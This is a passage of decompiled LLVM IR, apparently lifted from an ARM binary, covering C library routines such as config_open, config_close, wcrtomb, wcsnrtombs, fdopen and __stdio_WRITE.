  store i8 %v2_2c2d0, i8* %v1_2c2c4, align 1
  %v0_2c2d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2c2d4.pr, label %bb73, label %.dec_label_pc_2c2d8_crit_edge

.dec_label_pc_2c2d8_crit_edge:                    ; preds = %bb71
  %v0_2c2d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2c2d8

dec_label_pc_2c2d8:                               ; preds = %.dec_label_pc_2c2d8_crit_edge, %dec_label_pc_2c2c4
  %v0_2c2d8 = phi i32 [ %v0_2c2d8.pre, %.dec_label_pc_2c2d8_crit_edge ], [ %v3_2c2c4, %dec_label_pc_2c2c4 ]
  %v2_2c2d8 = icmp eq i32 %v0_2c2d8, 0
  store i1 %v2_2c2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c2d8, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_2c2d8
  %v1_2c2dc = load i32, i32* @fp, align 4
  %v2_2c2dc = trunc i32 %v1_2c2dc to i8
  %v3_2c2dc = load i32, i32* @r4, align 4
  %v4_2c2dc = inttoptr i32 %v3_2c2dc to i8*
  store i8 %v2_2c2dc, i8* %v4_2c2dc, align 1
  %v5_2c2dc = load i32, i32* @r4, align 4
  %v6_2c2dc = add i32 %v5_2c2dc, 1
  store i32 %v6_2c2dc, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_2c2d8, %bb72
  %v2_2c2e0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_2c2e0, i32* %r3.global-to-local, align 4
  %v2_2c2e4 = icmp eq i32 %v2_2c2e0, 0
  store i1 %v2_2c2e4, i1* %cpsr_z.global-to-local, align 1
  %v0_2c300.pre = load i32, i32* @r4, align 4
  br i1 %v2_2c2e4, label %dec_label_pc_2c2fc, label %dec_label_pc_2c2ec

dec_label_pc_2c2ec:                               ; preds = %bb73
  store i32 %v0_2c300.pre, i32* @r0, align 4
  %v1_2c2f4 = inttoptr i32 %v0_2c300.pre to i8*
  %v2_2c2f4 = call i32 @__GI_strspn(i8* %v1_2c2f4)
  store i32 %v2_2c2f4, i32* %r0.global-to-local, align 4
  %v0_2c2f8 = load i32, i32* @r4, align 4
  %v2_2c2f8 = add i32 %v0_2c2f8, %v2_2c2f4
  store i32 %v2_2c2f8, i32* @r4, align 4
  br label %dec_label_pc_2c2fc

dec_label_pc_2c2fc:                               ; preds = %bb73, %dec_label_pc_2c2ec
  %v0_2c300 = phi i32 [ %v2_2c2f8, %dec_label_pc_2c2ec ], [ %v0_2c300.pre, %bb73 ]
  %v0_2c2fc = load i32, i32* @r6, align 4
  %v1_2c2fc = add i32 %v0_2c2fc, 1
  store i32 %v1_2c2fc, i32* @r6, align 4
  %v1_2c300 = inttoptr i32 %v0_2c300 to i8*
  %v2_2c300 = load i8, i8* %v1_2c300, align 1
  %v3_2c300 = zext i8 %v2_2c300 to i32
  store i32 %v3_2c300, i32* %r2.global-to-local, align 4
  %v2_2c304 = icmp eq i8 %v2_2c300, 0
  store i1 %v2_2c304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c304, label %dec_label_pc_2c31c, label %dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge

dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge:  ; preds = %dec_label_pc_2c2fc
  %v0_2c30c.pre = load i32, i32* @r7, align 4
  %v1_2c30c = inttoptr i32 %v0_2c30c.pre to i8*
  %v2_2c30c = load i8, i8* %v1_2c30c, align 1
  %v3_2c30c = zext i8 %v2_2c30c to i32
  store i32 %v3_2c30c, i32* %r3.global-to-local, align 4
  %v9_2c310 = icmp eq i8 %v2_2c30c, %v2_2c300
  store i1 %v9_2c310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2c310, label %dec_label_pc_2c31c, label %bb74

bb74:                                             ; preds = %dec_label_pc_2c30c.preheader, %dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge
  %v2_2c25888 = phi i32 [ %v1_2c2fc, %dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge ], [ %v1_2c23c, %dec_label_pc_2c30c.preheader ]
  %v0_2c25887 = phi i32 [ %v0_2c300, %dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge ], [ %v0_2c30013, %dec_label_pc_2c30c.preheader ]
  %v2_2c314 = load i32, i32* @sb, align 4
  %v3_2c314 = sub i32 %v2_2c25888, %v2_2c314
  %v5_2c314 = xor i32 %v2_2c314, %v2_2c25888
  %v6_2c314 = xor i32 %v3_2c314, %v2_2c25888
  %v7_2c314 = and i32 %v6_2c314, %v5_2c314
  %v8_2c314 = icmp slt i32 %v7_2c314, 0
  %v9_2c314 = icmp slt i32 %v3_2c314, 0
  %v10_2c314 = icmp eq i32 %v2_2c25888, %v2_2c314
  store i1 %v10_2c314, i1* %cpsr_z.global-to-local, align 1
  %v2_2c318 = xor i1 %v9_2c314, %v8_2c314
  br i1 %v2_2c318, label %dec_label_pc_2c248, label %dec_label_pc_2c31c

dec_label_pc_2c31c:                               ; preds = %dec_label_pc_2c30c.preheader, %bb74, %dec_label_pc_2c2fc, %dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge, %dec_label_pc_2c300.preheader
  %v0_2c320 = phi i32 [ %v1_2c23c, %dec_label_pc_2c300.preheader ], [ %v1_2c23c, %dec_label_pc_2c30c.preheader ], [ %v2_2c25888, %bb74 ], [ %v1_2c2fc, %dec_label_pc_2c2fc ], [ %v1_2c2fc, %dec_label_pc_2c2fc.dec_label_pc_2c30c_crit_edge ]
  store i32 %v3_2c040, i32* %r2.global-to-local, align 4
  %v9_2c320 = icmp eq i32 %v0_2c320, %v3_2c040
  store i1 %v9_2c320, i1* %cpsr_z.global-to-local, align 1
  %v6_2c324 = icmp slt i32 %v0_2c320, %v3_2c040
  br i1 %v6_2c324, label %dec_label_pc_2c328, label %dec_label_pc_2c334

dec_label_pc_2c328:                               ; preds = %dec_label_pc_2c31c
  %v0_2c328 = load i32, i32* @r8, align 4
  %v1_2c328 = and i32 %v0_2c328, 1048576
  %v2_2c328 = icmp eq i32 %v1_2c328, 0
  store i1 %v2_2c328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c328, label %dec_label_pc_2c080.backedge, label %dec_label_pc_2c330

dec_label_pc_2c330:                               ; preds = %dec_label_pc_2c328, %dec_label_pc_2c1e8, %.thread, %entry
  br label %dec_label_pc_2c334

dec_label_pc_2c334:                               ; preds = %dec_label_pc_2c31c, %dec_label_pc_2c104, %dec_label_pc_2c330
  %v0_2c334 = phi i32 [ %v0_2c114, %dec_label_pc_2c104 ], [ 0, %dec_label_pc_2c330 ], [ %v0_2c320, %dec_label_pc_2c31c ]
  store i32 %v0_2c334, i32* %r0.global-to-local, align 4
  store i32 %v3_2c01c, i32* @r4, align 4
  store i32 %v6_2c01c, i32* @r5, align 4
  store i32 %v9_2c01c, i32* @r6, align 4
  store i32 %v12_2c01c, i32* @r7, align 4
  store i32 %v15_2c01c, i32* @r8, align 4
  store i32 %v18_2c01c, i32* @sb, align 4
  store i32 %v21_2c01c, i32* @sl, align 4
  store i32 %v24_2c01c, i32* @fp, align 4
  ret i32 %v0_2c334

; uselistorder directives
  uselistorder i32 %v0_2c334, { 1, 0 }
  uselistorder i32 %v0_2c320, { 0, 2, 1 }
  uselistorder i32 %v3_2c314, { 1, 0 }
  uselistorder i32 %v2_2c314, { 1, 0, 2 }
  uselistorder i32 %v2_2c25888, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_2c310, { 1, 0 }
  uselistorder i32 %v0_2c300.pre, { 0, 2, 1 }
  uselistorder i32 %v5_2c294, { 1, 0, 2, 3 }
  uselistorder i1 %v9_2c31086, { 1, 0 }
  uselistorder i1 %v9_2c238, { 1, 0 }
  uselistorder i32 %v3_2c210, { 0, 2, 1, 3 }
  uselistorder i1 %v7_2c1e8, { 1, 0 }
  uselistorder i1 %v8_2c1e0, { 1, 0 }
  uselistorder i32 %v3_2c1b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_2c1a0, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_2c188, { 1, 0, 2 }
  uselistorder i32 %v1_2c178, { 1, 0, 2 }
  uselistorder i32 %v0_2c164, { 0, 2, 1, 3 }
  uselistorder i32 %v1_2c15c, { 1, 0 }
  uselistorder i32 %v1_2c148, { 1, 0 }
  uselistorder i32 %v1_2c144, { 1, 0 }
  uselistorder i32 %v2_2c120, { 1, 0 }
  uselistorder i32 %v1_2c104, { 2, 0, 1 }
  uselistorder i32 %v0_2c0ec, { 1, 0 }
  uselistorder i32 %v1_2c0dc, { 0, 2, 1 }
  uselistorder i1 %v2_2c20c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_2c068, { 2, 0, 1, 3 }
  uselistorder i32 %v1_2c05c, { 2, 1, 0 }
  uselistorder i32 %v3_2c044, { 1, 0 }
  uselistorder i32 %v3_2c040, { 2, 1, 0 }
  uselistorder i32 %v1_2c038, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 9, 8, 13, 12, 15, 14, 16, 17, 19, 18, 23, 20, 21, 22, 26, 24, 25, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 3, 13, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_2c334, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c31c, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_2c2fc, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2c2b0, { 1, 0 }
  uselistorder label %dec_label_pc_2c080.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2c228, { 1, 0 }
  uselistorder label %dec_label_pc_2c1e8, { 1, 0 }
  uselistorder label %dec_label_pc_2c1dc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2c1a0, { 1, 0 }
  uselistorder label %dec_label_pc_2c0d4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_2c348 = icmp eq i32* %arg1, null
  br i1 %v2_2c348, label %dec_label_pc_2c370, label %dec_label_pc_2c350

dec_label_pc_2c350:                               ; preds = %entry
  %v2_2c350 = load i32, i32* %arg1, align 4
  %v1_2c354 = inttoptr i32 %v2_2c350 to i16*
  %v2_2c354 = call i32 @__GI_fclose(i16* %v1_2c354)
  %v0_2c358 = load i32, i32* @r4, align 4
  %v1_2c358 = add i32 %v0_2c358, 20
  %v2_2c358 = inttoptr i32 %v1_2c358 to i32*
  %v3_2c358 = load i32, i32* %v2_2c358, align 4
  %v2_2c35c = icmp eq i32 %v3_2c358, 0
  br i1 %v2_2c35c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_2c350
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_2c350, %bb
  store i32 181096, i32* @lr, align 4
  %v1_2c364 = xor i1 %v2_2c35c, true
  call void @__pseudo_cond_branch(i1 %v1_2c364, i32 ptrtoint (i32* @global_var_29ae4.1572 to i32))
  %v0_2c368 = load i32, i32* @r4, align 4
  store i32 %v0_2c368, i32* @r0, align 4
  %v0_2c36c = call i32 @free()
  br label %dec_label_pc_2c370

dec_label_pc_2c370:                               ; preds = %entry, %bb6
  %v1_2c374 = phi i32 [ 0, %entry ], [ %v0_2c36c, %bb6 ]
  ret i32 %v1_2c374

; uselistorder directives
  uselistorder label %dec_label_pc_2c370, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2c384 = load i32, i32* @r4, align 4
  store i32 %v3_2c384, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36148), i32* @r1, align 4
  %v0_2c38c = load i32, i32* @r0, align 4
  %v2_2c38c = call i32 @__GI_fopen(i32 %v0_2c38c, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36148))
  store i32 %v2_2c38c, i32* %r0.global-to-local, align 4
  store i32 %v2_2c38c, i32* @r4, align 4
  %v2_2c390 = icmp eq i32 %v2_2c38c, 0
  br i1 %v2_2c390, label %bb, label %dec_label_pc_2c39c

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_2c39c:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_2c3a4 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_2c3a4, i32* %r0.global-to-local, align 4
  %v2_2c3a8 = icmp eq i32 %v2_2c3a4, 0
  br i1 %v2_2c3a8, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_2c39c
  %v1_2c3ac = load i32, i32* @r4, align 4
  %v3_2c3ac = inttoptr i32 %v2_2c3a4 to i32*
  store i32 %v1_2c3ac, i32* %v3_2c3ac, align 4
  %v1_2c3b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_2c39c, %bb4
  %v1_2c3b4 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_2c39c ], [ %v1_2c3b4.pre, %bb4 ]
  %v2_2c3b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2c3b0, i32* @r4, align 4
  ret i32 %v1_2c3b4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36148), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_2c3c0 = load i32, i32* @lr, align 4
  %v2_2c3c4 = icmp eq i32 %arg1, 0
  br i1 %v2_2c3c4, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_2c3cc = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_2c3f4 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_2c3e0 = phi i32 [ %arg1, %.thread ], [ %v3_2c3cc, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_2c3dc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_2c3dc, i32* @ip, align 4
  %v2_2c3e4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_2c3dc, i32* %stack_var_-16, align 4
  store i32 %v0_2c3f4, i32* %stack_var_-12, align 4
  %v5_2c3fc = inttoptr i32 %v0_2c3e0 to i8*
  %v6_2c3fc = call i32 @__GI_wcsnrtombs(i8* %v5_2c3fc, i32 %v2_2c3e4, i32 1, i32 16, i32 %arg3)
  %v2_2c400 = icmp eq i32 %v6_2c3fc, 0
  br i1 %v2_2c400, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_2c410 = phi i32 [ %v6_2c3fc, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_2c3c0, i32* @lr, align 4
  ret i32 %v1_2c410

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_2c428 = load i32, i32* @r0, align 4
  %v1_2c428 = load i32, i32* @r1, align 4
  %v5_2c428 = inttoptr i32 %v0_2c428 to i8*
  %v6_2c428 = call i32 @__GI_wcsnrtombs(i8* %v5_2c428, i32 %v1_2c428, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_2c428

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2c438 = load i32, i32* @r4, align 4
  store i32 %v3_2c438, i32* %stack_var_-12, align 4
  %v10_2c43c = icmp eq i32 %tmp, %arg2
  store i1 %v10_2c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_2c43c, label %dec_label_pc_2c454, label %bb

bb:                                               ; preds = %entry
  %v4_2c440 = icmp eq i8* %arg1, null
  store i1 %v4_2c440, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_2c440, label %dec_label_pc_2c454.thread, label %bb39

dec_label_pc_2c454.thread:                        ; preds = %bb
  %v2_2c444 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_2c454:                               ; preds = %entry
  %v2_2c4441 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_2c454 = icmp eq i8* %arg1, null
  store i1 %v3_2c454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2c454, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_2c454
  store i32 %v2_2c4441, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_2c454, %dec_label_pc_2c454.thread
  %storemerge20 = phi i32 [ %v2_2c4441, %dec_label_pc_2c454 ], [ %v2_2c444, %dec_label_pc_2c454.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_2c4b028 = phi i32 [ %v2_2c4441, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_2c46c = load i32, i32* @r3, align 4
  %v3_2c46c = icmp uge i32 %v0_2c46c, %arg3
  %arg3.v0_2c46c = select i1 %v3_2c46c, i32 %arg3, i32 %v0_2c46c
  store i32 %arg3.v0_2c46c, i32* %r5.global-to-local, align 4
  %v1_2c478 = inttoptr i32 %arg2 to i32*
  %v2_2c478 = load i32, i32* %v1_2c478, align 4
  store i32 %v2_2c478, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_2c46c, i32* %r0.global-to-local, align 4
  %v2_2c4c422 = icmp eq i32 %arg3.v0_2c46c, 0
  store i1 %v2_2c4c422, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c4c422, label %dec_label_pc_2c4cc, label %dec_label_pc_2c484

dec_label_pc_2c484:                               ; preds = %.thread14.thread, %dec_label_pc_2c4bc.dec_label_pc_2c484_crit_edge
  %v2_2c4b0 = phi i32 [ %v2_2c4bc, %dec_label_pc_2c4bc.dec_label_pc_2c484_crit_edge ], [ %v2_2c4b028, %.thread14.thread ]
  %v0_2c490 = phi i32 [ %v0_2c484.pre, %dec_label_pc_2c4bc.dec_label_pc_2c484_crit_edge ], [ %v2_2c478, %.thread14.thread ]
  %v1_2c484 = inttoptr i32 %v0_2c490 to i32*
  %v2_2c484 = load i32, i32* %v1_2c484, align 4
  %v7_2c488 = icmp eq i32 %v2_2c484, 127
  store i1 %v7_2c488, i1* %cpsr_z.global-to-local, align 1
  %v1_2c48c = urem i32 %v2_2c484, 256
  store i32 %v1_2c48c, i32* @ip, align 4
  %v1_2c490 = add i32 %v0_2c490, 4
  store i32 %v1_2c490, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_2c484, 128
  br i1 %tmp45, label %dec_label_pc_2c4ac, label %dec_label_pc_2c498

dec_label_pc_2c498:                               ; preds = %dec_label_pc_2c484
  %v0_2c498 = call i32 @__GI___errno_location()
  store i32 %v0_2c498, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_2c4a4 = inttoptr i32 %v0_2c498 to i32*
  store i32 84, i32* %v2_2c4a4, align 4
  %v0_2c4d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2c4d8

dec_label_pc_2c4ac:                               ; preds = %dec_label_pc_2c484
  %v2_2c4ac = icmp eq i32 %v1_2c48c, 0
  store i1 %v2_2c4ac, i1* %cpsr_z.global-to-local, align 1
  %v1_2c4b0 = trunc i32 %v2_2c484 to i8
  %v3_2c4b0 = inttoptr i32 %v2_2c4b0 to i8*
  store i8 %v1_2c4b0, i8* %v3_2c4b0, align 1
  %v0_2c4b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2c4b4, label %.dec_label_pc_2c4cc_crit_edge, label %dec_label_pc_2c4bc

dec_label_pc_2c4bc:                               ; preds = %dec_label_pc_2c4ac
  %v0_2c4bc = load i32, i32* %lr.global-to-local, align 4
  %v1_2c4bc = load i32, i32* %r4.global-to-local, align 4
  %v2_2c4bc = add i32 %v1_2c4bc, %v0_2c4bc
  store i32 %v2_2c4bc, i32* %lr.global-to-local, align 4
  %v0_2c4c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_2c4c0 = add i32 %v0_2c4c0, -1
  store i32 %v1_2c4c0, i32* %r0.global-to-local, align 4
  %v2_2c4c4 = icmp eq i32 %v1_2c4c0, 0
  store i1 %v2_2c4c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c4c4, label %dec_label_pc_2c4cc, label %dec_label_pc_2c4bc.dec_label_pc_2c484_crit_edge

dec_label_pc_2c4bc.dec_label_pc_2c484_crit_edge:  ; preds = %dec_label_pc_2c4bc
  %v0_2c484.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2c484

.dec_label_pc_2c4cc_crit_edge:                    ; preds = %dec_label_pc_2c4ac
  %v1_2c4b4 = load i32, i32* @ip, align 4
  store i32 %v1_2c4b4, i32* %r2.global-to-local, align 4
  %v0_2c4cc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_2c4cc

dec_label_pc_2c4cc:                               ; preds = %dec_label_pc_2c4bc, %.dec_label_pc_2c4cc_crit_edge, %.thread14.thread
  %v0_2c4cc = phi i32 [ %v0_2c4cc.pre, %.dec_label_pc_2c4cc_crit_edge ], [ %v2_2c4b028, %.thread14.thread ], [ %v2_2c4bc, %dec_label_pc_2c4bc ]
  %v1_2c4cc = load i32, i32* @sp, align 4
  %v9_2c4cc = icmp eq i32 %v0_2c4cc, %v1_2c4cc
  store i1 %v9_2c4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2c4cc, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_2c4cc
  %v1_2c4d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_2c4d0, i32* %v1_2c478, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_2c4cc, %bb43
  %v0_2c4d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_2c4d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_2c4d4 = sub i32 %v1_2c4d4, %v0_2c4d4
  store i32 %v2_2c4d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2c4d8

dec_label_pc_2c4d8:                               ; preds = %dec_label_pc_2c498, %bb44
  %v0_2c4d8 = phi i32 [ %v0_2c4d8.pre, %dec_label_pc_2c498 ], [ %v2_2c4d4, %bb44 ]
  store i32 %v0_2c4d8, i32* %r0.global-to-local, align 4
  %v2_2c4e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2c4e0, i32* %r4.global-to-local, align 4
  ret i32 %v0_2c4d8

; uselistorder directives
  uselistorder i32 %v0_2c4d8, { 1, 0 }
  uselistorder i32 %v1_2c4c0, { 1, 0 }
  uselistorder i32 %v2_2c4bc, { 0, 2, 1 }
  uselistorder i32 %v1_2c48c, { 1, 0 }
  uselistorder i32 %v2_2c484, { 2, 0, 1, 3 }
  uselistorder i32 %v2_2c4b028, { 1, 0 }
  uselistorder i32 %v2_2c4441, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 2, 5, 1, 3, 0, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 6, 3, 4, 5, 0, 7, 1, 8, 9 }
  uselistorder i32 127, { 4, 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c4d8, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_2c4cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2c484, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_2c4fc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 %v2_2c4fc, i32* %r0.global-to-local, align 4
  %v7_2c500 = icmp eq i32 %v2_2c4fc, -1
  br i1 %v7_2c500, label %bb, label %bb10

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread

bb10:                                             ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %bb, %bb10
  %v1_2c514 = xor i1 %v7_2c500, true
  call void @__pseudo_cond_branch(i1 %v1_2c514, i32 ptrtoint (i32* @global_var_23f3c.1946 to i32))
  %v1_2c520 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2c520

; uselistorder directives
  uselistorder i1 %v7_2c500, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 3, 4, 0, 1, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_2c524 = load i32, i32* @r4, align 4
  store i32 %v3_2c524, i32* %stack_var_-24, align 4
  %v12_2c524 = load i32, i32* @r7, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_2c53c2 = icmp eq i32 %arg3, 0
  store i1 %v2_2c53c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c53c2, label %dec_label_pc_2c5cc, label %dec_label_pc_2c544

dec_label_pc_2c53cthread-pre-split:               ; preds = %dec_label_pc_2c544
  %v3_2c55c = load i32, i32* %r6.global-to-local, align 4
  %v5_2c55c = add i32 %v3_2c55c, %v3_2c554
  store i32 %v5_2c55c, i32* %r6.global-to-local, align 4
  %v4_2c560 = load i32, i32* %r5.global-to-local, align 4
  %v5_2c560 = sub i32 %v4_2c560, %v3_2c554
  store i32 %v5_2c560, i32* %r5.global-to-local, align 4
  %v2_2c53c = icmp eq i32 %v5_2c560, 0
